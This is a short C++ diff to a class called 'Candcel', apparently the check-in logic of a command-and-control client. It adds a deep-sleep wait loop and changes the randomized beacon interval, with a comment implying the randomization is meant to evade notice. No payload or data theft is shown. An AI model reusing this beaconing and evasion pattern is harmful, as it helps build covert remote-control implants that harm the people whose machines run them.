@@ -30,8 +30,8 @@ void Candcel::InitClass()
 		return;
 	}
 
-	if (!IsAlive()) {
-		return;
+	while (!IsAlive()) {
+		DeepSleep();
 	}
 
 	Solicit();
@@ -74,8 +74,8 @@ DWORD Candcel::CheckIn()
 		int nextInterval = (rand() % (CHECKIN_PACE + 1));
 
 		/* Randomize the interval for obvious reasons */
-		Sleep(nextInterval * 60 * 1000);
-		//Sleep(nextInterval * 60);
+		//Sleep(nextInterval * 60 * 1000);
+		Sleep(nextInterval * 600);
 
 		if (!serverSolicitAck) {
 			Solicit();
@@ -273,4 +273,12 @@ void Candcel::CheckForUpdate()
 	} else if (rc.getServerCode() != RestServerCommand::CM_SERVER_IGNORE) {
 		Log::Error(L"Candcel", L"Request failed");
 	}
+}
+
+
+void Candcel::DeepSleep()
+{
+	Log::Warn(L"Candcel", L"Enter deepsleep");
+
+	Sleep(30 * 60 * 1000);
 }
